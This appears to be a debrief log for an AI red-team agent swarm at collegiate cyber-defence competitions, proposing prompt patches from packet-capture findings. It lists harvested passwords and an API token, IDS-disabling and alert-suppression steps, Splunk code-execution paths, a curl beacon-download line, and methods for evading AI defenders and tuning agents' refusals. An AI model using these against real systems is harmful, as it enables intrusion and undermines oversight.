# Debrief Queue — Training Run Findings

Maintained by: TRAIN-002 (Training Evaluator), dispositioned by operator, consumed by TRAIN-003 (Prompt Patcher)
Purpose: Structured list of issues identified during a training run, each with a disposition category that determines the corrective action. After operator review and disposition confirmation, items marked PROMPT-FIX, TEMPLATE-FIX, or WORKFLOW-FIX are sent to TRAIN-003 for patch generation.

---

## Active Debrief

Source run: PCAP Analysis — 2026-inv2 (manual findings, no /training-run)
Date: 2026-03-16
Operator: —
Status: CLOSED — patch-20260316-3.md generated

---

## Disposition Legend

PROMPT-FIX: a competition agent's system prompt needs a correction (add knowledge, fix command template, adjust decision framework, improve refusal handling).

TEMPLATE-FIX: a coordination file template needs revision (add/rename column, change status values, adjust format, add documentation).

WORKFLOW-FIX: a slash command workflow needs adjustment (change agent invocation order, add verification step, modify output format, adjust handoff).

OPERATOR-TRAINING: the operator needs to learn something — not a swarm issue (tool usage, workflow optimization, expectation alignment).

WONTFIX: acceptable limitation — document the manual fallback. Operator provides rationale.

NEEDS-TRIAGE: unclear categorization — requires operator discussion to disposition.

---

## Findings

<!-- ===== 2026-inv2 DEBRIEF (2026-03-16) ===== -->

### Finding #13

Disposition: PROMPT-FIX
Agent: EXPLOIT-001
Severity: BLOCKING
Category: RECOMMENDATION-QUALITY

Description: EXPLOIT-001 has no knowledge of Keycloak IAM as a credential spray target. inv2 confirmed Keycloak on .103:8080 exposes user credentials in cleartext HTTP POST bodies. 21 unique user/password pairs were harvested, all shared identically across all 32 teams. `popcorn1?` hits 3 accounts simultaneously. This is the highest-yield credential spray target ever observed across all three PCAP analyses.
Evidence: 21 cleartext credential pairs extracted from inv2 Keycloak POST traffic to /realms/master/protocol/openid-connect/token. Identical user accounts (ajordan, arexford, cbaines, codom, dlopez, epark, eyu, flin, gcruz, hzhang, jteller, kkashani, knixon, lchoi, macosta, mcole, menwright, mrodriguez, oaziz, rnormandy, rpatel) confirmed across 32 teams. popcorn1? shared by mcole, jteller, mrodriguez. Competition-themed password: OMGaTREX1?.
Root cause: Keycloak not in prior PCAP data; first appearance in inv2. No Keycloak entry in EXPLOIT-001 prompt.
Proposed fix: Add "Keycloak IAM Service — Credential Spray Target" section to EXPLOIT-001 with spray endpoint, all 21 user accounts, top-10 priority passwords (popcorn1? first), admin console paths, and post-auth attack paths (user enumeration, password reset, OIDC token forge).

---

### Finding #14

Disposition: PROMPT-FIX
Agent: EXPLOIT-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: EXPLOIT-001 has no knowledge of Graylog as an attack target. inv2 introduced Graylog on .170:9000 as the per-team SIEM. The scoring engine's API token was captured in cleartext HTTP Basic Auth and is identical across all 32 teams. This token gives direct API access to search logs, modify stream alerts (suppressing blue team notifications), and add log inputs (potential persistence). Attack looks identical to scoring engine traffic — extremely low detection risk.
Evidence: Graylog scoring token `12afjthotgefe01fv714tec0ag9qeuf3qup9a36bcecicbo11fj0` captured in HTTP Basic Auth header across all 32 teams. API endpoints confirmed: GET /api/search/universal/relative, GET/POST /api/system/inputs. Web login default: admin/admin. Stream modification suppresses blue team alerts.
Root cause: Graylog not in prior PCAP data; first appearance in inv2. Replaces Splunk from inv5.
Proposed fix: Add "Graylog SIEM as Credential Target" section to EXPLOIT-001 with scoring token, API endpoints, web login defaults, and four attack paths. Note scoring advisory: do not rotate the Graylog admin password in a way that invalidates the scoring token.

---

### Finding #15

Disposition: PROMPT-FIX
Agent: EVADE-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: EVADE-001's "2026 Red Team Signatures to Avoid" section covers HTTP-based C2 (curl beacon) but has no DNS C2 guidance. inv2 revealed a pre-planted DNS C2 running 5-second fixed-interval A queries with hex-encoded subdomains. Only 1/32 human teams detected it in 65 minutes — but an AI blue team would detect the fixed interval and DGA-style subdomains within seconds. EVADE-001 needs to know when DNS C2 is detectable and how to harden it.
Evidence: 2026-inv2 DNS C2 pattern: A queries for [hex_id].[b58_suffix].log.jacobseunglee.com at exactly 5-second intervals via resolver 1.1.1.1. ~78 queries per 60-second file per host. 32 hosts beaconing simultaneously from T=0. Human detection rate: 1/32 in 65 min. AI blue team detection: certain via timing entropy analysis + DGA heuristics.
Root cause: DNS C2 not observed in prior PCAP data; first appearance in inv2. HTTP C2 guidance exists but DNS C2 has different detection surface.
Proposed fix: Add "DNS C2 Beacon Pattern — Signature and Detection Risk" section to EVADE-001. Include: fixed-interval detection risk, DGA subdomain detection risk, recommended mitigations (variable interval 30–120s, non-DGA subdomain format, DNS TXT queries, non-threat-intel domain), and SSH tunnel as preferred alternative.

---

### Finding #16

Disposition: PROMPT-FIX
Agent: RECON-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: RECON-001 now has quals and inv5 layouts but not inv2. The inv2 layout introduces Keycloak (.103), Graylog (.170), and a dual-web host (.37) not present in either prior event. Without the inv2 layout, RECON-001 cannot recommend immediate targeted scans against Keycloak and Graylog — the two highest-yield new targets. Additionally, inv2 has a shared DC at 10.100.100.12 accessible by all teams — a unique cross-team target not seen before.
Evidence: inv2 traffic confirms: .12=DC (great.cretaceous domain, TREX$ machine), .37=dual-web (WordPress+MediaWiki), .70=app (port 3000/8082), .76=gallery (HTTP/9000), .103=Keycloak+APIs (8080/8000/8001), .104=shop (HTTP/80), .170=Graylog (9000). Shared: 10.100.100.12 accessible to all 32 team subnets. 32 teams, subnets 10.100.101–132.x.
Root cause: Third distinct layout in three events. RECON-001 prompt needs all three patterns plus reinforced "verify first" warning.
Proposed fix: Append "WRCCDC 2026-inv2 Network Layout Pattern" subsection to RECON-001 after the inv5 subsection. Include full address-to-role map, competition domain (great.cretaceous), priority spray targets (.103 Keycloak first, .170 Graylog second), and note about shared 10.100.100.12 DC.

---

### Finding #17

Disposition: PROMPT-FIX
Agent: OPS-001
Severity: MEDIUM
Category: TIMING

Description: OPS-001 has two timing data points (quals: 17min, inv5: 88sec). inv2 adds a third that fills in the middle of the spectrum: no firewall deployed in 65 minutes, but password changes starting at T+21min. This three-point calibration lets OPS-001 reason about Regionals as a range rather than a point estimate. Also introduces a new concept: pre-planted access (DNS C2 from T=0) bypasses all timing windows entirely.
Evidence: inv2 Pass 3: no firewall deployed in 65-minute capture window. Password changes confirmed at T+21min (7 teams). DNS C2 detected by 1/32 teams at T+~12min. Three data points now: quals=17min SSH firewall, inv2=no firewall/65min, inv5=88sec. Pre-planted DNS C2 operated undetected for full 65-minute window on 31/32 teams.
Root cause: Only two timing calibration points existed; inv2 provides the third.
Proposed fix: Append "2026-inv2 Phase Timing Calibration" subsection to OPS-001's timing section. Include three-point response spectrum table, Regionals uncertainty range, pre-planted access note, and Graylog scoring token preservation advisory.

---

### Finding #18

Disposition: PROMPT-FIX
Agent: EVADE-001
Severity: MEDIUM
Category: RECOMMENDATION-QUALITY

Description: EVADE-001 has no pivot scanning technique documented. inv2 confirmed that compromised team hosts (.76 gallery server) were used as masscan pivots to reach internal subnets (192.16.220.0/24) unreachable from the red team jumpbox. This technique bypasses all external IDS and jumpbox IP-based firewall blocks. The caution is that heavy pivot scanning (43K SYNs) generates Graylog alerts if the host is log-shipping.
Evidence: 2026-inv2 traffic shows 10.100.106.76 generating 43,176 SYNs targeting 192.16.220.0/24 in one ~60-second file. Traffic originates from inside the team subnet. Rate consistent with masscan. Not visible in external red team traffic logs. Graylog on .170 would receive syslog from .76 if configured — high-volume scanning would generate visible spike.
Root cause: Pivot scanning not previously documented in EVADE-001; first confirmed in inv2.
Proposed fix: Add "Pivot Scanning via Compromised Team Hosts" section to EVADE-001. Include technique, why it bypasses external IDS, how to execute (upload masscan/nmap to compromised host), and detection risk caveat (use nmap -T2, not masscan, to avoid Graylog volume alerts from inside the subnet).

<!-- ===== END 2026-inv2 DEBRIEF ===== -->

<!-- ===== 2026-inv5 DEBRIEF (2026-03-16) ===== -->

### Finding #7

Disposition: PROMPT-FIX
Agent: RECON-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: RECON-001's 2026 network layout knowledge covers only the quals schema (.14=DC, .20=WordPress, .22=WinRM). The inv5 invitational used a completely different host-role-per-address map. RECON-001 must be updated to (a) present the inv5 layout as a second known pattern and (b) explicitly warn that host roles change between competition events — the agent must verify layout rather than assuming quals schema.
Evidence: 2026-inv5 traffic confirms: .17=DC (milkfarm), .60=Splunk (Work1), .63=ECommerce, .86=Roundcube (moomail), .98=Windows member, .2=firewall/ntopng. None of these match the quals offsets except .2. Competition domain changed to udderstrength.gym. 26 team subnets (10.100.100–125.0/24) vs quals' 30 teams.
Root cause: Only one year of PCAP data was embedded in RECON-001; a single-year sample created false confidence in a stable layout.
Proposed fix: Append "WRCCDC 2026-inv5 Network Layout Pattern" subsection under RECON-001's Common CCDC Infrastructure Patterns section, after the existing 2026-quals layout. Include full address-to-role map, new priority targets (.60 Splunk, .86 Roundcube, .2 ntopng, .17 DC), domain udderstrength.gym, and a prominent NOTE that layout varies by event — always run a quick targeted scan to confirm before committing to a spray sequence.

---

### Finding #8

Disposition: PROMPT-FIX
Agent: EXPLOIT-001
Severity: BLOCKING
Category: RECOMMENDATION-QUALITY

Description: EXPLOIT-001 has no knowledge of three new scored services confirmed in inv5: Roundcube webmail, Splunk SIEM, and ntopng network monitor. All three use default credentials. Missing these targets means the first 90 seconds of credential spray hits only the quals service set, leaving high-value access ungained before firewall deployment.
Evidence: inv5 traffic shows: Roundcube on .86 hosts (POST /?_task=login, fields _user/_pass/_timezone), Splunk on .60 hosts (port 8000, default admin/changeme), ntopng on .2 hosts (port 443/3000, default admin/admin). Username format changed to lowercase first-initial+lastname (e.g., pyoung). Service accounts moomoo/ceo are scoring-only (not for admin login).
Root cause: No inv5 credential intelligence embedded; EXPLOIT-001 only knows quals service targets.
Proposed fix: Add "2026-inv5 New Credential Targets" section to EXPLOIT-001 covering all three new services with specific login endpoints, POST field formats, default credentials, and the revised username format. Include the Splunk app upload attack path (high value, low noise).

---

### Finding #9

Disposition: PROMPT-FIX
Agent: EVADE-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: EVADE-001 has no knowledge of ntopng as a blue team monitoring tool deployed in competition networks. inv5 confirmed ntopng runs on .2 hosts and gives blue teams live flow tables, nDPI protocol detection, and anomaly scoring. Without knowing ntopng is present and can be disabled via its own default credentials, EVADE-001 cannot recommend the highest-value evasion action available in the first 90 seconds.
Evidence: inv5 traffic shows red team accessed ntopng on .2 hosts using admin/admin, navigated to /lua/rest/v2/disable/check.lua, and disabled ndpi_http_suspicious_header via POST. Red team also used ntopng's own API (/lua/rest/v2/get/flow/active_list.lua) to monitor their own traffic's alert score. ntopng modifications are logged — only use if blue team appears unaware.
Root cause: ntopng not in EVADE-001's detection surface model; prior data was quals-only which did not include ntopng.
Proposed fix: Add "ntopng Network Monitor — Evasion Technique" section to EVADE-001 with: detection capabilities, default credential access (admin/admin), IDS disable API path and POST payload, self-monitoring technique, and caveat about audit log visibility.

---

### Finding #10

Disposition: PROMPT-FIX
Agent: OPS-001
Severity: BLOCKING
Category: TIMING

Description: OPS-001's current timing model (patched from 2026-quals) sets the initial access window at 2–3 minutes for AI blue team. inv5 data invalidates this: experienced human teams at inv5 deployed firewall rules in 88 SECONDS. This is 12x faster than quals and means the AI-blue-team estimate must be further revised downward to 15–60 seconds. An OPS-001 operating on the 2–3 minute window will recommend sequential sprays when simultaneous parallel launch at T=0 is required.
Evidence: inv5 Pass 3 analysis: fastest team deployed HTTP firewall at T+88s. 83% of teams firewalled within 22 minutes. Active SSH/RDP sessions survived firewall deployment — only new connections were blocked. Current OPS-001 prompt (patched 2026-03-16) still references 2–3 min window.
Root cause: 2026-quals quals was the only timing data when OPS-001 was last patched; inv5 represents more experienced blue teams closer to Regionals skill level.
Proposed fix: Append a "REVISED Phase Timing — AI Blue Team (updated from 2026-inv5)" subsection to OPS-001's existing 2026 timing section. Key changes: initial window 60–90s maximum; launch ALL credential sprays simultaneously at T=0 (do not wait for scan results); active sessions survive firewall — prioritize session establishment and keepalives above all else.

---

### Finding #11

Disposition: PROMPT-FIX
Agent: RECON-001
Severity: MEDIUM
Category: RECOMMENDATION-QUALITY

Description: RECON-001 has no knowledge of VXLAN overlay infrastructure which WRCCDC uses to deliver team networks. If the jumpbox has access to the underlay (10.1.3.x), passive VXLAN monitoring reveals all team subnets and their hosts without generating any traffic toward team hosts — a zero-noise reconnaissance method that bypasses all detection. RECON-001 should check for VXLAN access at session start.
Evidence: inv5 traffic confirms VXLAN (UDP 4789) through 10.1.3.1–6 VTEPs. VNI encoding: VNI 100–125 = team subnets 100–125. Red team VTEP at 10.1.3.20 (VNI 220). This pattern may recur at Regionals.
Root cause: VXLAN not previously observed in PCAP data; first confirmed in inv5.
Proposed fix: Add "VXLAN Overlay Network Pattern" section to RECON-001's scan strategy. Include underlay IP range, VNI-to-team mapping, passive tap technique, and instruction to verify VXLAN access before beginning traditional scanning.

---

### Finding #12

Disposition: PROMPT-FIX
Agent: EXPLOIT-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: EXPLOIT-001 has no Splunk-specific attack path documented. inv5 confirmed that Splunk with default credentials gives code execution via malicious app upload — a high-value, low-noise vector that persists across Splunk restarts and runs as the Splunk service account (often root). This should be a Tier A quick-win in EXPLOIT-001's playbook whenever Splunk is detected.
Evidence: inv5 traffic shows Splunk app upload POST to /en-US/manager/appinstall/upload_app followed by verification GET to /en-US/splunkd/__raw/services/apps/local/[appname]. Single multipart POST, low noise, looks like normal admin activity. Detection risk LOW.
Root cause: Splunk not previously encountered in PCAP data; first confirmed attack path in inv5.
Proposed fix: Add "Splunk SIEM as Initial Access / Persistence Vector" section to EXPLOIT-001's Quick-Win Service Exploits. Include Attack Path A (malicious app upload with exact URL and verification step) and Attack Path B (search head command injection). Rate as Tier A when Splunk is found with default creds.

<!-- ===== END 2026-inv5 DEBRIEF ===== -->

### Finding #1

Disposition: PROMPT-FIX
Agent: RECON-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: RECON-001 has no knowledge of the WRCCDC 2026 team subnet layout. Without this, it recommends full blind discovery scans rather than targeted scans against known host positions, wasting the critical early window.
Evidence: 2026-quals traffic confirms all 30 teams use 10.100.1XX.0/24 with identical host-role-per-address scheme (.14=DC, .20=WordPress, .22=WinRM, .2=primary Linux, etc.). RECON-001's current prompt contains no year-specific topology data.
Root cause: PCAP intelligence not yet embedded in agent prompts — this is the first PCAP analysis run.
Proposed fix: Add "WRCCDC 2026 Network Layout Pattern" subsection to RECON-001's system prompt under Common CCDC Infrastructure Patterns. Include full address-to-role map, priority host list (.2, .14, .20, .22), shared segment (10.100.100.0/24), and scoring engine IP (10.2.1.5).

---

### Finding #2

Disposition: PROMPT-FIX
Agent: RECON-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: RECON-001 recommends masscan-style full-rate scanning with no AI blue team calibration. 2026-quals data shows masscan at ~180 pps triggers SSH firewall within 17 minutes by human teams — an AI blue team will respond in 2–3 minutes, invalidating any scan that takes longer.
Evidence: tshark analysis of 2026-quals PCAPs shows SYN flood signature (paired SYNs within 40μs, window 1024, TTL 36, MSS-only options) and SSH host count drop from 43 → 5 at T+17min. AI blue team equivalent response estimated at 2–3 minutes based on log-correlation capability.
Root cause: RECON-001 has no AI blue team response timing model; defaults to standard CCDC scan cadence.
Proposed fix: Add "Scan Rate Calibration for AI Blue Team" section to RECON-001. Include: no full-rate masscan, use nmap -T2/-T1 against known ports only, leverage known layout to skip discovery, limit to ports 22/80/389/443/445/3389/5985, distribute across multiple source IPs, target completion within 5 minutes.

---

### Finding #3

Disposition: PROMPT-FIX
Agent: EXPLOIT-001
Severity: BLOCKING
Category: RECOMMENDATION-QUALITY

Description: EXPLOIT-001 has no 2026-specific credential intelligence. The 2026 quals established a confirmed working credential, AD domain, username format, password pattern, and spray priority order that are all directly reusable at 2026 Regionals.
Evidence: WordPress admin:WaterIsWet?? verified by scoring engine traffic. Domain rmwpra.hydration confirmed in NTLM spray traffic. AD usernames FIRSTNAME_LASTNAME (all-caps, underscore) observed across 5 spray sources. Password pattern: [ThemeWord][Adjective][SpecialChars]. SSH spray window: T+0 to T+15min before firewall deployment.
Root cause: No prior PCAP analysis had been run; credential intelligence not embedded.
Proposed fix: Add "2026 Competition Credential Intelligence" section to EXPLOIT-001. Include domain, confirmed credential, password pattern, AD username format with examples, service accounts (Administrator, backup), and prioritized spray order (SSH first → LDAP/SMB → WordPress → WinRM). Add note about scoring engine: do not change admin:WaterIsWet?? password on compromised WordPress hosts.

---

### Finding #4

Disposition: PROMPT-FIX
Agent: EVADE-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: EVADE-001 lacks specific 2026 red team traffic signatures that the AI blue team will have been trained on. Without these, EVADE-001 cannot warn the operator away from burned patterns or recommend specific mitigations.
Evidence: Four distinct burned signatures identified in 2026-quals PCAPs: (1) masscan TCP fingerprint (window 1024, TTL 36, paired SYNs), (2) curl C2 beacon (GET /JSyausLR/LinIUpdater, periodic ~30–60s), (3) NTLM spray clustering (10+ sources, same timestamps, port 389), (4) WinRM POST /wsman from non-admin IP.
Root cause: No prior PCAP analysis; burned signatures not documented in agent prompts.
Proposed fix: Add "2026 Red Team Signatures to Avoid (BURNED PATTERNS)" section to EVADE-001. Include all four signatures with specific TCP/HTTP field values, detection likelihood against AI blue team, and per-signature mitigations. Add AI-specific general mitigations: vary scan source IPs per team, HTTPS C2 only, browser UA strings, legitimate-looking paths.

---

### Finding #5

Disposition: PROMPT-FIX
Agent: OPS-001
Severity: BLOCKING
Category: TIMING

Description: OPS-001's phase timing model is calibrated for human blue teams (~17 minute SSH response window). Against an AI blue team, this model produces catastrophically wrong time budgets — the actual initial access window is 2–3 minutes, not 17. An OPS-001 operating with the wrong timing model will recommend spending time on discovery when the window has already closed.
Evidence: 2026-quals: SSH firewall deployed at T+17min by human teams. AI blue team log-correlation capability implies 2–3 minute equivalent. Current OPS-001 prompt references CCDC defaults with no AI blue team timing adjustment.
Root cause: No AI blue team timing model exists in OPS-001; defaults to human-defender assumptions.
Proposed fix: Add "2026 Competition Phase Timing" section to OPS-001. Include the full observed 2026 quals timeline, adjusted AI blue team timeline (T+0–3min undetected window, T+5min window closes), and recommended three-phase structure: Phase 1 (T+0–5, ultra-fast targeted credential spray), Phase 2 (T+5–30, exploit + encrypted persistence), Phase 3 (T+30+, encrypted channels only).

---

### Finding #6

Disposition: PROMPT-FIX
Agent: PERSIST-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: PERSIST-001 may recommend or fail to warn against HTTP-based implant delivery (curl download + cron execution), which is the exact technique used in 2026 quals. This technique is trivially detected by an AI blue team within 2 minutes and would result in rapid persistence removal.
Evidence: 2026-quals: curl http://10.230.87.61/JSyausLR/LinIUpdater ELF beacon at ~30–60s intervals ran undetected for 115 minutes against HUMAN teams. AI blue team HTTP log correlation would flag this immediately. No current warning in PERSIST-001 about this pattern.
Root cause: 2026 quals technique is not documented as burned in PERSIST-001; agent has no AI-blue-team-specific persistence guidance.
Proposed fix: Add "2026 Quals Persistence Technique — DO NOT REUSE" section to PERSIST-001. Document the exact technique, explain the four reasons it fails against AI blue team (HTTP logging, periodic beacon signature, no encryption, ELF-over-HTTP flagging), and provide preferred alternatives: SSH authorized_keys injection, cron with existing binaries, systemd oneshot service, SSH tunneling for C2, HTTPS C2 with jittered timing and browser UA.

<!-- TRAIN-002 appends findings here using this format:

### Finding #N

Disposition: [PROMPT-FIX | TEMPLATE-FIX | WORKFLOW-FIX | OPERATOR-TRAINING | NEEDS-TRIAGE]
Agent: {agent ID}
Severity: [BLOCKING | HIGH | MEDIUM | LOW]
Category: [REFUSAL | COMMAND-ACCURACY | COORDINATION | TIMING | RECOMMENDATION-QUALITY]

Description: {what happened}
Evidence: {the specific command, refusal text, or inconsistency}
Root cause: {assessment of why this happened}
Proposed fix: {recommendation for how to address it}

-->

---

## Debrief History

Previous debriefs are archived below with their disposition summaries. Full patch files are in training/patches/.

No previous debriefs.
